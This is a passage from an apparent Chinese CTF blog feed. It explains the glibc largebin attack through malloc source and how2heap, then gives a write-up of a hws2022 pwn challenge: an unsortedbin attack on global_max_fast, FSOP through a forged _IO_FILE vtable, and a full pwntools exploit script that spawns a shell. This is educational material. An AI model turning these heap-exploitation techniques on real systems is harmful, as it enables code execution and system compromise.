class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">// here1</span></span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">              == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">// here2</span></span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意看注释写的here2部分。这里能够像<code>unsortedbin</code>一样，往可控块写入当前堆地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>在<code> largebin中</code> 小于链表中最小的 <code>chunk</code> 的时候会执行前一句，反之执行后一句。<strong>当两者大小相同时，无法利用。</strong></p><p>另外需要注意，伪造的堆块<code>fd_nextsize</code>需要设置为0.不然无法通过以下unlink检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* unlink */</span></span><br><span class="line">unlink_chunk (av, victim);</span><br></pre></td></tr></table></figure><h2 id="how2heap-largebin-attack"><a href="#how2heap-largebin-attack" class="headerlink" title="how2heap-largebin attack"></a>how2heap-largebin attack</h2><p>现在的how2heap竟然有网页版了，方便很多</p><h3 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h3><p>首先程序分配了一个0x420的堆块，和一个0x20的保护堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>); <span class="comment">// chunk1</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p>接下来分配了一个新的0x500的堆块。和一个保护堆块，之后再次重复。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">// chunk2</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">// chunk3</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p>之后free(p1),free(p2)，他们会被放在unsortedbin中。</p><p><img src="/2022/01/29/largebin-attack/image-20220129142721399.png" alt="image-20220129142721399"></p><p>接下来**malloc(0x90)**这将会从unsortedbin末尾chunk中切割出0xa0大小空间，并把0x510的chunk放到largebin中，然后剩下的0x430-0xa0的chunk，仍然被放回到unsortedbin中。这一步完成了许多过程</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li><li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li><li> 再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li><li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li><li> 现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li></ul><p>如下图。</p><p><img src="/2022/01/29/largebin-attack/image-20220129143135813.png" alt="image-20220129143135813"></p><p>接下来释放chunk3。他会被插入到unsortedbin中。可以看到是插在最前面。</p><p><img src="/2022/01/29/largebin-attack/image-20220129143454363.png" alt="image-20220129143454363"></p><p>接下来是触发部分。设置p2(在largebins中的块)先看一下没改的时候堆布局</p><p><img src="/2022/01/29/largebin-attack/image-20220129144212899.png" alt="image-20220129144212899"></p><p>将largebin按照如下方式修改。改自身size，bk和bk_nextsize。fd和fd_nextsize均写为0，按照前面所说的。</p><p><img src="/2022/01/29/largebin-attack/image-20220129144900563.png" alt="image-20220129144900563"></p><p>在接下来分配0x90的块，使得unsortedbin中的chunk能够插入largebin之前，先看一下堆布局。</p><p><img src="/2022/01/29/largebin-attack/image-20220129145052204.png" alt="image-20220129145052204"></p><p>之后，就能成功写入两个值。写入的是被插入unsortedbin中的chunk地址。</p><p><strong>这是因为当前插入的chunk属于largebin，大小为0x410(取出Unsortedbin，放入对应largebin中)寻找到fwd的size是0x3f0被我们修改过，小于0x410，会相应的执行这一句</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</span><br><span class="line"><span class="comment">// then</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p><strong>注意这里的fwd是经过遍历比较找到的正好比自己小的那个chunk。这里0x3f0正好比自己小。插入在0x3f0后面。此时执行上述代码，相当于利用原先largebin中我们伪造好的指针，写入了main arena数据</strong>此时应该修改了var2，因为它在bk_nextsize位置。</p><p><img src="/2022/01/29/largebin-attack/image-20220129145322368.png" alt="image-20220129145322368"></p><p>同时，可以看到var1也被修改了，因为存在以下利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">(fwd-&gt;bk)-&gt;fd = victim;</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">*(addr1+<span class="number">2</span>) = victim;</span><br></pre></td></tr></table></figure><p>相当于是这个chunk入链的操作，这里和nusortedbin attack一模一样。</p><h3 id="总结-2-27"><a href="#总结-2-27" class="headerlink" title="总结-2.27"></a>总结-2.27</h3><p>利用largebin attack的条件，和能够达成的效果。</p><blockquote><p>条件：</p><p>可以修改一个 large bin chunk 的 data</p><ol><li>victim chunk’s size修改成比下一个进来的chunk小即可，但是要确保被修改的首先被存放在largebins中，因为要从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li><li>fd_nextsize修改为0</li><li>修改fd_nextsize为target-0x20，fd为target-0x10，就可以在这两个地方写入数据</li></ol></blockquote><blockquote><p> 效果：</p><ol><li><p>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</p></li><li><p>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP</p></li></ol></blockquote><blockquote><p>注意：</p><p>unsortedbin插入在头部，取出在尾部</p><p>largebin中</p><ul><li>按照大小从大到小排序</li><li>若大小相同,按照free时间排序</li><li>若干个大小相同的堆块,只有首堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>会指向其他堆块,后面的堆块的<code>fd_nextsize</code>和<code>bk_nextsize</code>均为0</li><li>size最大的chunk的<code>bk_nextsize</code>指向最小的chunk; size最小的chunk的<code>fd_nextsize</code>指向最大的chunk</li></ul></blockquote><p><img src="/2022/01/29/largebin-attack/image-20220129163143279.png" alt="image-20220129163143279"></p><h3 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h3><p>glibc2.31为largebin添加了两条类似unsortedbin中的检查。分别检查bck和bk指针是否被修改过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过此检查的基本思路是：<strong>分配一个最小的chunk到largebin中，如果当前块比这个bin中所有块都要小，就能够绕过检验，直接写入。</strong>注意上面是改的较小的chunk，这里是较大的。然后最小的chunk</p><p>接下来是how2heap的做法</p><p>首先是创建了0x428,0x18,0x418,0x18四个chunk。记0x428的chunk为p1，0x418的chunk为p2。大小选择需要确保p2小于p1，并且两个在同一个bins中。</p><p>接着释放p1（较大的那个），p1将存在于unsortedbin中，分配一个p3(比p1大)让p1进入largebin。现在bins如下所示。</p><p><img src="/2022/01/29/largebin-attack/image-20220129161319249.png" alt="image-20220129161319249"></p><p>之后释放p2，p2进入unsortedbin。如下图</p><p><img src="/2022/01/29/largebin-attack/image-20220129161549534.png" alt="image-20220129161549534"></p><p>现在修改p1的<code>bk_nextsize</code>为我们想要的地址-0x20</p><p><img src="/2022/01/29/largebin-attack/image-20220129161858696.png" alt="image-20220129161858696"></p><p>之后创建一个chunk，使得unsortedbin中的chunk(p2)被放入largebin中。注意，此时p2大小是小于p1的。</p><blockquote><p>此时glibc有一个机制：当被放入的chunk是当前largebin中<strong>最小的chunk时</strong>，不会检查<code> chunk-&gt;bk_nextsize</code>。我们上述修改就会生效。</p></blockquote><p>此时，目标地址将写入原先在unsortedbin中的chunk的地址。</p><p><img src="/2022/01/29/largebin-attack/image-20220129162221450.png" alt="image-20220129162221450"></p><blockquote><p>这里修改的又是较大的chunk，可能会感到疑惑？</p><p>这是因为largebin 的fd_nextsize和bk_nextsize构成的是一个环形链表。<strong>可能需要记住的是在2.31中，修改的是较大块，在2.27之前，修改的是较小的</strong>。</p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/189848">https://www.anquanke.com/post/id/189848</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/</a></p><p><a href="https://www.anquanke.com/post/id/242640">https://www.anquanke.com/post/id/242640</a></p><p><a href="https://xz.aliyun.com/t/5177?page=1">https://xz.aliyun.com/t/5177?page=1</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hws2022冬令营入营赛pwn</title>
      <link href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/"/>
      <url>/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/</url>
      
        <content type="html"><![CDATA[<p>2022年hws硬件安全冬令营入营赛赛题复现。</p><span id="more"></span><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>签到题整的这么难</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>所有的free都是UAF，并且可以直接泄露libc，可以任意写unsortedbin一次。libc 2.27-3ubuntu1.2，可以tcache double free</p><p>但是堆操作、堆分配大小都受限。</p><p>一开始在获得libc之后就卡住了。因为一方面改freehook则free次数不够，另一方面打global max_fast之后改写free_hook也很困难，因为fastbin有大小检查，而且我们能够拿到的堆块大小只能是0x1000。</p><p>之后问了别的师傅，了解到伪造vtable打IO_file。这也是以前没有学习过的利用方式。</p><p>关于IO_FILE<a href="https://blog.csdn.net/qq_39153421/article/details/115327308">参考了这篇文章</a>还是写的很详细的。</p><h3 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h3><p>参考链接：</p><p><a href="http://t.zoukankan.com/luoleqi-p-12360280.html">链接1</a>、<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#unsorted-bin-attack_1">链接2_ctfwiki</a></p><p>我们覆写global_max_fast，是因为以下代码。当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>使用如下payload，成功改掉global_max_fast。因为我们可以对global_max_fast直接写</p><p><img src="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/image-20220128131439078.png" alt="image-20220128131439078"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(main_arena) + p64(global_max_fast-<span class="number">0x10</span>) <span class="comment">#overwrite global_max_fast</span></span><br></pre></td></tr></table></figure><h3 id="fsop"><a href="#fsop" class="headerlink" title="fsop"></a>fsop</h3><p>接着用unsortedbin attack再去改IO_file结构体。</p><p>改之前</p><p><img src="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/image-20220128141718501.png" alt="image-20220128141718501"></p><p>改之后。可以看到就改成了自己的堆地址。</p><p><img src="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/image-20220128141742742.png" alt="image-20220128141742742"></p><p>然后通过在自己的堆结构里面伪造一个vtable。具体代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_file = pack_file(_IO_read_base=IO_list_all-<span class="number">0x10</span>,_IO_write_base=<span class="number">0</span>,_IO_write_ptr=<span class="number">1</span>,_IO_buf_base=binsh_addr,_mode=<span class="number">0</span>,)</span><br><span class="line">fake_file+=p64(IO_str_jumps-<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(system)</span><br></pre></td></tr></table></figure><p>简要分析一下流程。首先输入构造的Unsortedbin之后，结构如下</p><p><img src="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/image-20220128142850512.png" alt="image-20220128142850512"></p><p>unsortedbin attck能够写入_IO_list_all为之前本堆块地址（回顾unsortedbin attack相关代码）这就相当于劫持IO_file结构体并伪造。</p><p>之后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_file += p64(IO_str_jumps-<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(system)</span><br></pre></td></tr></table></figure><p>将vtable指针写成<code>IO_str_jumps-8</code>，之后p64(0)和p64(system)就在vtable指针结构体里面了。这里关键就是<code>IO_str_jumps-8</code>指向的是我们能够控制的地址。类似下图。只不过这里利用<code>IO_str_jumps-8</code>完成了连续的输入。而且/bin/sh的位置也不太一样。</p><blockquote><p>这里有一点比较关键，就是选择大小为0x1430。是要经过精确计算的。只有这样才能改到_IO_list_all指针处。因为我们改写了global_max_fast，因此会被当作smallbin，可以类似house of orange 触发fsop。具体的计算方法，可以先通过一个0x1000的块，找这个块被free之后位置，再找<code>_IO_list_all</code>看一下偏移，再决定分配多少大小的块才能被unsortedbin attack放在io_file的位置。</p></blockquote><p><img src="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/image-20220128152928892.png" alt="image-20220128152928892"></p><p>之后就可以拿到一个shell</p><p><img src="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/image-20220128153000239.png" alt="image-20220128153000239"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>64位fsop脚本，可以通用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_file</span>(<span class="params">_flags = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_read_ptr = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_read_end = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_read_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_write_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_write_ptr = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_write_end = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_buf_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_buf_end = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_save_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_backup_base = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_save_end = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_marker = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_IO_chain = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_fileno = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_lock = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_wide_data = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">_mode = <span class="number">0</span></span>):</span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">    p32(<span class="number">0</span>) + \</span><br><span class="line">    p64(_IO_read_ptr) + \</span><br><span class="line">    p64(_IO_read_end) + \</span><br><span class="line">    p64(_IO_read_base) + \</span><br><span class="line">    p64(_IO_write_base) + \</span><br><span class="line">    p64(_IO_write_ptr) + \</span><br><span class="line">    p64(_IO_write_end) + \</span><br><span class="line">    p64(_IO_buf_base) + \</span><br><span class="line">    p64(_IO_buf_end) + \</span><br><span class="line">    p64(_IO_save_base) + \</span><br><span class="line">    p64(_IO_backup_base) + \</span><br><span class="line">    p64(_IO_save_end) + \</span><br><span class="line">    p64(_IO_marker) + \</span><br><span class="line">    p64(_IO_chain) + \</span><br><span class="line">    p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># cmd = &quot;brva 0xACC\n&quot; # debug after unsortedbin attack</span></span><br><span class="line">    <span class="comment"># cmd = &quot;brva 0xB3D\n&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;brva 0xB78\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;what size?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x1430</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;what size?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">20480</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Do you want to rename?(y/n)&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">main_arena = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;main_arena: &#x27;</span> + <span class="built_in">hex</span>(main_arena))</span><br><span class="line">libc_base = main_arena - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc_base &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">global_max_fast = libc_base+<span class="number">0x3ed940</span></span><br><span class="line">success(<span class="string">&quot;global_max_fast: &quot;</span> + <span class="built_in">hex</span>(global_max_fast))</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;io_list_all: &quot;</span> + <span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">IO_str_jumps = <span class="number">0x3e8360</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = p64(main_arena) + p64(global_max_fast-<span class="number">0x10</span>) <span class="comment">#overwrite global_max_fast</span></span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">debug()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;please input your new name!&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Do you want to edit big box or bigger box?(1:big/2:bigger)\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># edit smaller one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;:\n&#x27;</span>) <span class="comment"># read into the smaller ptr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_file 放的地方是smallbin中。使用需要满足以下条件</span></span><br><span class="line"><span class="comment"># --------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 1. 已经改过global_max_fast。否则需要house of orange</span></span><br><span class="line"><span class="comment"># 2. 之后可以free这个堆块</span></span><br><span class="line"><span class="comment"># 3. IO_str_jumps寻找方法: 使用find_jmp找到偏移，直接用libc_base加。</span></span><br><span class="line"><span class="comment"># --------------------------------------------------------------------</span></span><br><span class="line">fake_file = pack_file(_IO_read_base=IO_list_all-<span class="number">0x10</span>,</span><br><span class="line">_IO_write_base=<span class="number">0</span>,</span><br><span class="line">_IO_write_ptr=<span class="number">1</span>,</span><br><span class="line">_IO_buf_base=binsh_addr,</span><br><span class="line">_mode=<span class="number">0</span>,)</span><br><span class="line">fake_file += p64(IO_str_jumps-<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(fake_file[<span class="number">0x10</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是find_jmp.py 直接运行即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find_jmp.py </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span 